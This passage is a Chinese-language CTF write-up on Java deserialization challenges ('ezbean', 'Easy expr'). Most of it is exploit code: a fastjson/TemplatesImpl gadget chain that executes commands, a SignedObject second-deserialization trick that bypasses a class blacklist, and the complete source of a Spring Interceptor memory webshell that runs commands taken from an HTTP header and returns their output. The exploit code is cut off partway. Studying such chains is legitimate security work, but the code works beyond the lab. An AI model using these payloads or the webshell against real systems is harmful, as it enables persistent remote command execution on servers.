+</span></span><span class="line"><span class="cl">        <span class="n">clazz</span><span class="o">.</span><span class="na">addConstructor</span><span class="o">(</span><span class="n">constructor</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clazz</span><span class="o">.</span><span class="na">getClassFile</span><span class="o">().</span><span class="na">setMajorVersion</span><span class="o">(</span><span class="mi">49</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">clazz</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">genPayload</span><span class="o">(</span><span class="s">&#34;open -na Calculator&#34;</span><span class="o">)});</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;1&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">JSONArray</span> <span class="n">jsonArray</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONArray</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">jsonArray</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">BadAttributeValueExpException</span> <span class="n">bd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setValue</span><span class="o">(</span><span class="n">bd</span><span class="o">,</span><span class="s">&#34;val&#34;</span><span class="o">,</span><span class="n">jsonArray</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">bd</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashMap</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">URLEncoder</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()))));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>在read路由打一下data成功rce</p>
+<p><figure 
+	>
+	<a href="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205013-1.png" >
+		<img src="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205013-1.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="easy-expr">Easy expr</h2>
+<p>  本题是基于ezbean进行魔改，依赖springboot 和 fastjson1.2.47，其中SecureUtil重写了ObjectInputStream用<code>List&lt;Object&gt; BLACKLIST</code>过滤TemplatesImpl,因此ezbean的打法在本题会失效，我们可以通过二次反序列化绕过，即<strong>在受害服务器进行第一次反序列化的过程中借助某些类的方法进行第二次反序列化</strong>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SecureUtil</span> <span class="kd">extends</span> <span class="n">ObjectInputStream</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">Set</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">blackList</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">SecureUtil</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">in</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">resolveClass</span><span class="o">(</span><span class="n">ObjectStreamClass</span> <span class="n">cls</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">blackList</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">cls</span><span class="o">.</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidClassException</span><span class="o">(</span><span class="s">&#34;Unexpected serialized class&#34;</span><span class="o">,</span> <span class="n">cls</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveClass</span><span class="o">(</span><span class="n">cls</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><hr>
+<p>这里需要用到jdk内置类SignedObject，其可以存放一个序列化数据并且有一个属于该数据的签名，其getObject方法进行了一次反序列化，因此可以得到修改后的利用链</p>
+<pre tabindex="0"><code>//gadget
+//绕过第一次的TemplatesImpl黑名单检查
+BadAttributeValueExpException#readObject() -&gt; 
+JSONOBJECT#toString() -&gt; 
+SignedObject#getObject() -&gt; 
+//二次反序列化
+//引用绕过JSON自带resolveClass的黑名单检查
+BadAttributeValueExpException#readObject() -&gt; 
+JSONArray#toString() -&gt; 
+TemplatesImpl#getOutputProperties() -&gt; 
+TemplatesImpl#newTransformer() -&gt; 
+TemplatesImpl#getTransletInstance() -&gt; 
+TemplatesImpl#defineTransletClasses() -&gt; 
+TemplatesImpl#defineClass() -&gt; 
+</code></pre><p>当时做题时由于环境不出网，有了注入内存马的需求。参考网上现有一些师傅的思路是注入回显Spring Controller内存马，但实际一直无法执行命令，最终尝试注入Spring Interceptor内存马。（由于Interceptor的调用顺序在controller之前，对于某些一定需要权限的接口，就无法做到完美的权限维持，而Interceptor内存马能够弥补这样的缺陷）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//Spring Interceptor内存马 TestInterceptor.java
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.HandlerInterceptor</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.ModelAndView</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.handler.AbstractHandlerMapping</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestInterceptor</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="kd">implements</span> <span class="n">HandlerInterceptor</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">TestInterceptor</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">    		<span class="c1">//通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebApplicationContext</span><span class="o">)</span> <span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//通过IOC容器中的AbstractHandlerMapping
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">AbstractHandlerMapping</span> <span class="n">abstractHandlerMapping</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">AbstractHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//通过反射来获取adaptedInterceptors字段（因为该字段为私有
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">AbstractHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;adaptedInterceptors&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">adaptedInterceptors</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;)</span><span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">abstractHandlerMapping</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//防止死循环
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">TestInterceptor</span> <span class="n">memoryInterceptor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TestInterceptor</span><span class="o">(</span><span class="s">&#34;aaa&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">/</span><span class="err">将要注入的过滤器放入到</span><span class="n">adaptedInterceptors</span><span class="err">中</span>
+</span></span><span class="line"><span class="cl">        <span class="n">adaptedInterceptors</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">memoryInterceptor</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">TestInterceptor</span><span class="o">(</span><span class="n">String</span> <span class="n">aaa</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">command</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">&#34;aaaaaa&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span><span class="n">command</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">PrintWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">o</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ProcessBuilder</span> <span class="n">p</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;win&#34;</span><span class="o">)){</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">command</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">command</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">c</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">start</span><span class="o">().</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">o</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">c</span><span class="o">.</span><span class="na">next</span><span class="o">():</span> <span class="n">o</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">c</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">postHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">ModelAndView</span> <span class="n">modelAndView</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">afterCompletion</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>exp:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.URLEncoder</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.*</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSONArray</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.CtConstructor</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.io.IOUtils</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.codec.binary.Base64</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Reflections</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.KeyPair</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.KeyPairGenerator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.Signature</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.SignedObject</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.ArrayList</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import static</span> <span class="nn">ysoserial.Serializer.serialize</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">FJ5</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
+</span></span><span class="line"><span class="cl">      	<span class="c1">//将内存马转化为恶意字节码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">CtClass</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">ysoserial</span><span class="o">.</span><span class="na">TestInterceptor</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clazz</span><span class="o">.</span><span class="na">getClassFile</span><span class="o">().</span><span class="na">setMajorVersion</span><span class="o">(</span><span class="mi">52</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">				<span class="n">setValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">code</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;1&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">//第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>         
